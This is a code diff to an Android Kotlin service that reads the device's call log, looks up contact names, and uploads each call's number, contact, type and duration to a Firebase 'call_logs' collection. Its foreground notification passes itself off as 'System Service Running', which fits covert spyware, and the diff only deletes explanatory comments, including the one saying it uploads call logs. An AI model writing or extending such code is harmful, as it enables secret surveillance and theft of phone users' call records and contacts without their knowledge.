@@ -19,9 +19,6 @@ import com.google.firebase.Timestamp
 import com.google.firebase.firestore.FirebaseFirestore
 import java.util.*
 
-/**
- * Service that monitors call logs and uploads them to Firebase
- */
 class CallLogService : Service() {
     companion object {
         private const val TAG = "CallLogService"
@@ -48,7 +45,6 @@ class CallLogService : Service() {
         firestore = FirebaseFirestore.getInstance()
         prefs = getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
         
-        // Create the notification channel
         NotificationChannelManager.createNotificationChannel(
             this,
             CHANNEL_ID,
@@ -56,17 +52,14 @@ class CallLogService : Service() {
             NotificationManager.IMPORTANCE_LOW
         )
         
-        // Register call log observer
         registerCallLogObserver()
         
-        // Check for existing call logs
         checkExistingCallLogs()
     }
     
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.d(TAG, "CallLogService started")
         
-        // Create a notification for the foreground service
         val notification = createNotification()
         startForeground(NOTIFICATION_ID, notification)
         
@@ -83,7 +76,7 @@ class CallLogService : Service() {
     }
     
     private fun createNotification(): Notification {
-        // Create an intent that will open the app when tapped
+        
         val notificationIntent = Intent(this, this::class.java)
         val pendingIntent = PendingIntent.getActivity(
             this,
@@ -92,7 +85,6 @@ class CallLogService : Service() {
             PendingIntent.FLAG_IMMUTABLE
         )
         
-        // Build the notification
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("System Service Running")
             .setContentText("Maintaining system services...")
@@ -134,10 +126,9 @@ class CallLogService : Service() {
     }
     
     private fun checkExistingCallLogs() {
-        // Get the timestamp of the last processed call
+        
         val lastCallTime = prefs.getLong(LAST_CALL_TIME_KEY, 0L)
         
-        // Query content provider for call logs
         val cursor = contentResolver.query(
             CallLog.Calls.CONTENT_URI,
             arrayOf(
@@ -172,12 +163,10 @@ class CallLogService : Service() {
                         val date = it.getLong(dateIndex)
                         val duration = it.getInt(durationIndex)
                         
-                        // Update most recent timestamp if needed
                         if (date > mostRecentTimestamp) {
                             mostRecentTimestamp = date
                         }
                         
-                        // Get call type string
                         val callType = when (type) {
                             CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                             CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
@@ -186,7 +175,6 @@ class CallLogService : Service() {
                             else -> "UNKNOWN"
                         }
                         
-                        // Resolve contact name
                         val contactName = getContactName(number)
                         
                         Log.d(TAG, "Found call: $number ($contactName), type: $callType, duration: $duration sec")
@@ -194,7 +182,6 @@ class CallLogService : Service() {
                     }
                 } while (it.moveToNext())
                 
-                // Update the last processed timestamp
                 prefs.edit().putLong(LAST_CALL_TIME_KEY, mostRecentTimestamp).apply()
             }
         }
@@ -203,7 +190,6 @@ class CallLogService : Service() {
     private fun getContactName(phoneNumber: String): String? {
         var contactName: String? = null
         
-        // Query the contacts database
         val uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber))
         val cursor = contentResolver.query(
             uri,
@@ -242,7 +228,7 @@ class CallLogService : Service() {
         )
         
         firestore.collection("call_logs")
-            .document(id)  // Using call ID as document ID to prevent duplicates
+            .document(id)  
             .set(callData)
             .addOnSuccessListener {
                 Log.d(TAG, "Call log uploaded with ID: $id")
